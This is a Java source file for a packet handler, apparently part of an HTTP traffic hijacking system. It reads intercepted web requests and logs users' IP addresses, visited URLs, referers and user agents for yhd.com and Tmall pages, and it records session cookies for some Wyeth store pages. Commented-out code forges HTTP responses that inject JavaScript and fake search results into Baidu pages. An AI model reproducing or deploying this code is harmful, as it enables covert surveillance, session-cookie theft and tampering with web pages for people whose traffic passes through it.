package com.asme.collector.packet.handler;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import com.asme.collector.packet.HttpGetPacket;
import com.asme.collector.util.SystemTime;

/**
 * @author ASME
 *
 * 2012-8-21
 */
public class CollYHDHandler implements HttpGetPacketHandler {

	private static final Log log = LogFactory.getLog(CollYHDHandler.class);
	
//	private static Set<String> IPIP = new HashSet<String>();
//	static {
//		try {
//			BufferedReader r = new BufferedReader(new InputStreamReader(new FileInputStream("spip.txt")));
//			for(String line = r.readLine(); line != null; line = r.readLine()) {
//				IPIP.add(line.trim());
//			}
//			r.close();
//		} catch (FileNotFoundException e) {
//			e.printStackTrace();
//		} catch (IOException e) {
//			e.printStackTrace();
//		}
//		
//	}
	

	// 计数器
	public static final AtomicLong HIJACKED = new AtomicLong(0);
	public static final AtomicLong DOMAPPED = new AtomicLong(0);

	// 控制劫持频率的Map
	private static ConcurrentHashMap<String, Long> freqControlMap = new ConcurrentHashMap<String, Long>(2<<20);

	// 复用的StringBuilder
	private StringBuilder sb = new StringBuilder();

	// 系统时间
	private static SystemTime systemTime;

	public static LinkedBlockingQueue<String[]> URLQ = new LinkedBlockingQueue<String[]>();
	public static void init(){
		final File dir = new File("cmsyhd");
		if(!dir.exists()) dir.mkdirs();
		
		final File yhdvisit = new File("yhdvisit");
		if(!yhdvisit.exists()) yhdvisit.mkdirs();
		
		final File yhdbuy = new File("yhdbuy");
		if(!yhdbuy.exists()) yhdbuy.mkdirs();
		
		final File huishi = new File("huishi");
		if(!huishi.exists()) huishi.mkdirs();

		Thread t = new Thread("YHDWriter") {
			
			private int hour = systemTime.getHour();

			public void run() {
				
				BufferedWriter fyhd = null;
				SimpleDateFormat hmat = new SimpleDateFormat("yyyyMMddHH");
				File yhd = new File(dir, hmat.format(System.currentTimeMillis()) + ".txt");
				try { fyhd = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd, yhd.exists()), "GBK")); } catch (Exception e) {}
				
				BufferedWriter fyhdbuy = null;
				File yhd2 = new File(yhdbuy, hmat.format(System.currentTimeMillis()) + ".txt");
				try { fyhdbuy = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd2, yhd2.exists()), "GBK")); } catch (Exception e) {}
				
				BufferedWriter fyhdvisit = null;
				File yhd3 = new File(yhdvisit, hmat.format(System.currentTimeMillis()) + ".txt");
				try { fyhdvisit = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd3, yhd3.exists()), "GBK")); } catch (Exception e) {}
				
				BufferedWriter fhuishi = null;
				File hs = new File(huishi, hmat.format(System.currentTimeMillis()) + ".txt");
				try { fhuishi = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(hs, hs.exists()), "GBK")); } catch (Exception e) {}
				
				
				SimpleDateFormat fmat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				for(;!Thread.interrupted();) {
					String[] u = null;
					try {
						u = URLQ.poll(1, TimeUnit.SECONDS);
					} catch (Exception e) {
						break;
					}
					
					int nowHour = systemTime.getHour();
					if(nowHour != hour) {
						try {
							fyhd.close();
//							yhd.renameTo(new File(dir, yhd.getName().replace("tmp", "txt")));
							yhd = new File(dir, hmat.format(System.currentTimeMillis()) + ".txt");
							fyhd = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd, yhd.exists()), "GBK"));
							
							fyhdbuy.close();
//							yhd2.renameTo(new File(yhdbuy, yhd2.getName().replace("tmp", "txt")));
							yhd2 = new File(yhdbuy, hmat.format(System.currentTimeMillis()) + ".txt");
							fyhdbuy = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd2, yhd2.exists()), "GBK"));
							
							fyhdvisit.close();
//							yhd3.renameTo(new File(yhdvisit, yhd3.getName().replace("tmp", "txt")));
							yhd3 = new File(yhdvisit, hmat.format(System.currentTimeMillis()) + ".txt");
							fyhdvisit = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(yhd3, yhd3.exists()), "GBK"));
							
							fhuishi.close();
//							yhd3.renameTo(new File(yhdvisit, yhd3.getName().replace("tmp", "txt")));
							hs = new File(huishi, hmat.format(System.currentTimeMillis()) + ".txt");
							fhuishi = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(hs, hs.exists()), "GBK"));
							
						} catch (IOException e) {
							e.printStackTrace();
						}
						hour = nowHour;
					}

					if(u == null) {
						try {
							fyhd.flush();
							fyhdbuy.flush();
							fyhdvisit.flush();
							fhuishi.flush();
						} catch (IOException e) {
							e.printStackTrace();
						}
						continue;
					}
					
					if("YHDVISIT".equals(u[0])){
						try {
							fyhdvisit.write(fmat.format(System.currentTimeMillis()) + "\t");
//							String uname = adslNameDAO.getUserName(u[1]);
//							fyhdvisit.write(uname == null ? "Unknow" : uname);
							fyhdvisit.write("Unknow");
							fyhdvisit.write("\t");
							fyhdvisit.write(u[1] + "\t");
							fyhdvisit.write(u[2] + "\t");
							fyhdvisit.write(u[3] + "\t");
							fyhdvisit.write(u[4] + "\t0\r\n");
						} catch (Exception e) {
							e.printStackTrace();
							try {
								fyhdvisit.close();
							} catch (Exception e1) {
								e1.printStackTrace();
							}
						}
					} else if("YHDBUY".equals(u[0])){
						try {
							fyhdbuy.write(fmat.format(System.currentTimeMillis()) + "\t");
//							String uname = adslNameDAO.getUserName(u[1]);
//							fyhdbuy.write(uname == null ? "Unknow" : uname);
							fyhdbuy.write("Unknow");
							fyhdbuy.write("\t");
							fyhdbuy.write(u[1] + "\t");
							fyhdbuy.write(u[2] + "\t");
							fyhdbuy.write(u[3] + "\t");
							fyhdbuy.write(u[4] + "\t0\r\n");
						} catch (Exception e) {
							e.printStackTrace();
							try {
								fyhdbuy.close();
							} catch (Exception e1) {
								e1.printStackTrace();
							}
						}
					} else if("WYETH".equals(u[0])){
						
						try {
							fhuishi.write(fmat.format(System.currentTimeMillis()) + "\t");
							fhuishi.write("Unknow");
							fhuishi.write("\t");
							fhuishi.write(u[1] + "\t");
							fhuishi.write(u[2] + "\t");
							fhuishi.write(u[3] + "\t");
							fhuishi.write(u[4] + "\t");
							fhuishi.write(u[5] + "\t0\r\n");
						} catch (Exception e) {
							e.printStackTrace();
							try {
								fyhdbuy.close();
							} catch (Exception e1) {
								e1.printStackTrace();
							}
						}
						
						
					}else {
						try {
							fyhd.write(fmat.format(System.currentTimeMillis()) + "\t");
//							String uname = adslNameDAO.getUserName(u[0]);
//							fyhd.write(uname == null ? "Unknow" : uname);
							fyhd.write("Unknow");
							fyhd.write("\t");
							fyhd.write(u[0] + "\t");
							fyhd.write(u[1] + "\t");
							fyhd.write(u[2] + "\t");
							fyhd.write(u[3] + "\t0\r\n");
						} catch (Exception e) {
							e.printStackTrace();
							try {
								fyhd.close();
							} catch (Exception e1) {
								e1.printStackTrace();
							}
						}
					}
				}
				try {
					fyhd.close();
					fyhdbuy.close();
					fyhdvisit.close();
					fhuishi.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		};
		t.setDaemon(true);
		t.start();
	}


	/**
	 * (non-Javadoc)
	 * 
	 * @see com.asme.hijack.HttpPacketHandler#handle(com.asme.hijack.HttpReqPacket)
	 */
	@Override
	public byte[] handle(HttpGetPacket packet) {

		if (packet.headers != null && packet.uri != null && packet.url != null) {

			String uri = packet.uri;
			String host = packet.headers.get("host");
			String referer = packet.headers.get("referer");

			if (host == null) return null;
			String ua = packet.headers.get("user-agent");
			if (ua == null) return null;
			String cookie = packet.headers.get("cookie");
			
			if ((packet.url.startsWith("http://item.yhd.com/item/"))) {
				URLQ.offer(new String[] { "YHDVISIT", packet.srcip, packet.url,
						referer == null ? "NO Referrer" : referer, ua });
			}
			
			if(packet.url.toLowerCase().startsWith("http://cms.yhd.com/")) {
				
				URLQ.offer(new String[]{packet.srcip, 
						packet.url,
						referer == null ? "NO Referrer" : referer,
						ua
				});
			}

			if(packet.url.startsWith("http://cart.yhd.com/cart/opt/add.do?") || packet.url.startsWith("http://www.yhd.com/cart/opt/fastBuy.do?")) {
				URLQ.offer(new String[]{"YHDBUY",packet.srcip, 
						packet.url,
						referer == null ? "NO Referrer" : referer,
						ua
				});
			}
					
			if(packet.url.startsWith("http://wyeth.tmall.com/p/rd495840.htm") 
					|| packet.url.startsWith("http://wyeth.tmall.com/p/rd495840.htm?mm_gxbid=1_327273_40875963670ca6df4ea639c920628d1d")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107223&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28022320")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107223&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28022320&mm_gxbid=1_327278_7032b0ef375d328e050a815838cd9208")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107224&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28876320")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107224&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28876320&mm_gxbid=1_327280_423df2e9f25d3c7383dbf1f4b385852b")
					|| packet.url.startsWith("http://wyeth.tmall.com/p/rd790801.htm")
					|| packet.url.startsWith("http://wyeth.tmall.com/p/rd790801.htm?mm_gxbid=1_327373_976f10ff79462481e73f1f42279bf61c")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107232&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28046296")
					|| packet.url.startsWith("http://mobile.tmall.com/mobile/page/llb?shareid=5654537&_bind=true&asac=D5JJFW716103XOLRS2OX&lpid=107232&lpt=1&lsid=95656259&page=shop/activity&userId=95656259&pageId=28046296&mm_gxbid=1_327376_5a965ea8e2f2a0d2cc80b30046c0d7fd")
					
					) {
				URLQ.offer(new String[]{"WYETH",packet.srcip, 
						packet.url,
						referer == null ? "NO Referrer" : referer,
						ua, cookie == null ? "NO Cookie" : cookie
				});
			}
			
//			if(packet.url.startsWith("http://fa.jd.com/loadFa_toJson.js?aid=2_163_817-2_163_818-2_232_3431-2_163_3743") ) {
//				URLQ.offer(new String[]{"JD",packet.srcip, 
//						packet.url,
//						referer == null ? "NO Referrer" : referer,
//						ua
//				});
//			}
			
//			if(referer != null && referer.equals("http://www.taobao.com/") && packet.url.indexOf("taobao") == -1 && packet.url.indexOf("ali") == -1
//					 && packet.url.indexOf("tanx") == -1
//					 && packet.url.indexOf("mmstat") == -1
//					 && packet.url.indexOf("tbcdn") == -1
//					 && packet.url.indexOf("mmcdn") == -1
//					 ) {
//				URLQ.offer(new String[]{"RTB",packet.srcip, 
//						packet.url,
//						referer,
//						ua
//				});
//			}

			// 百度搜索的
//			if(referer != null && packet.url.startsWith("http://suggestion.baidu.com/su?") && referer.startsWith("http://www.baidu.com/s?")) {
//				Map<String, String> querys = parseQuerys(referer.substring(23));
//				String q = querys.get("wd");
//				if (q != null) {
//					String e = "gbk";
//					if(querys.containsKey("ie")) e = querys.get("ie");
//					String keyword = null;
//					try {
//						keyword = URLDecoder.decode(q, e);
//						int i = keyword.indexOf("=");
//						if (i != -1) {
//							keyword = keyword.substring(i + 1);
//						}
//					} catch (Exception e1) {
//						keyword = null;
//					}
//					
//					if(keyword != null && keyword.indexOf("手机") != -1) {
//						try {
//							return "HTTP/1.1 200 OK\r\nServer: Ngnix\r\nContent-Length:921\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\nif(typeof HTMLElement!='undefined'&&HTMLElement.prototype.insertAdjacentHTML==undefined){HTMLElement.prototype.insertAdjacentHTML=function(where,html){var r=this.ownerDocument.createRange();r.setStartBefore(this);var parsedHTML=r.createContextualFragment(html);this.insertAdjacentElement(where,parsedHTML);}}window.onload=function(){document.getElementById('content_left').firstChild.insertAdjacentHTML('afterEnd','<table class=\"EC_mr15 EC_ppim_top ec_pp_f EC_result\"><tr><td class=\"f\"><h3 class=\"t\" style=\"padding-top:15px\"><a href=\"http://www.sina.com.cn/\" target=\"_blank\"> 伪造<em>手机</em>频道</a><span class=\"tsuf tsuf-op\"></span></h3><div style=\"font-size: 13px;margin-top: 2px;\">伪造<em>手机</em>频道是最权威的<em>手机</em>资讯中心,提供专业及时的<em>手机</em>报价,<em>手机</em>评测,<em>手机</em>行情,为您选购<em>手机</em>提供全方位的服务.并提供<em>手机</em>游戏,<em>手机</em>主题,手...</div></td></tr></table>');};".getBytes("GBK");
//						} catch (UnsupportedEncodingException e1) {
//						}
//					}
//				}
//			}

//			// 检查参数
//			if (referer == null) return null;
//			if(!isImg(uri) || referer.indexOf(".swf") != -1) return null;
//
//			// 看能不能匹配中当前需要劫持的URL
//			long fid = -1;
//			for(UrlFeature urlFeature : urlFeatures) {
//				if (referer.indexOf(urlFeature.feature) != -1 || urlFeature.feature.equals("*")) {
//					fid = urlFeature.id;
//					break;
//				}
//			}
//			if(fid == -1) return null;
//
//			// 构造key
//			String key = buildKey(packet.bsrcip, referer, ua);
//
//			// 劫持响应
//			try {
//				sb.append(RESP[0]).append(RESP[1]).append(RESP[2]).append(hijackerId).append(RESP[3]).append(fid).append(RESP[4]).append(URLEncoder.encode(packet.url, "utf-8")).append(RESP[5]);
//			} catch (Exception e) {
//				log.error("伪造响应数据包发生错误", e);
//				return null;
//			}
//			byte[] b = sb.toString().getBytes();
//			sb.delete(0, sb.length());
//
//			// 新key并且劫持响应不超长,则劫持这个请求
//			if (b.length <= MAX_PACKET_LEN && freqControlMap.putIfAbsent(key, systemTime.getTime()) == null) {
//				HIJACKED.getAndIncrement();
//				return b;
//			}
		} 
//		else if(packet.isPOST && packet.headers != null && packet.uri != null && packet.url != null) {
//			if(packet.url.startsWith("http://mall.10010.com/mall-web/GoodsDetail/promtlyBuy")) {
//				if(packet.referer != null) {
//					YHDSQ.offer(new String[]{"ISUNION", packet.srcip, 
//							packet.referer
//					});
//				}
//			}
//		}
		return null;
	}

	/**
	 * URL特征
	 * @author asme
	 */
	private static class UrlFeature {
		private long id;
		private String feature; 
		private UrlFeature(long id, String feature) {
			this.id = id;
			this.feature = feature;
		}
		public String toString() {
			return new StringBuilder(String.valueOf(id)).append("\t").append(feature).toString();
		}
	}



	/**
	 * @param systemTime the systemTime to set
	 */
	public static void setSystemTime(SystemTime systemTime) {
		CollYHDHandler.systemTime = systemTime;
	}
	
//	/**
//	 * @param adslNameDAO the adslNameDAO to set
//	 */
//	public static void setAdslNameDAO(AdslNameDAO adslNameDAO) {
//		PlantCookieHandler.adslNameDAO = adslNameDAO;
//	}

	/**
	 * 解析query串
	 * @param querys
	 * @return
	 */
	private static Map<String, String> parseQuerys(String querys) {
		Map<String, String> map = new HashMap<String, String>();
		if (querys == null || querys.isEmpty()) return map;
		String[] query = querys.split("&");
		for (String q : query) {
			String[] kv = q.split("=");
			if (kv.length > 1) {
				map.put(kv[0].toLowerCase(), kv[1]);
			}
		}
		return map;
	}
}
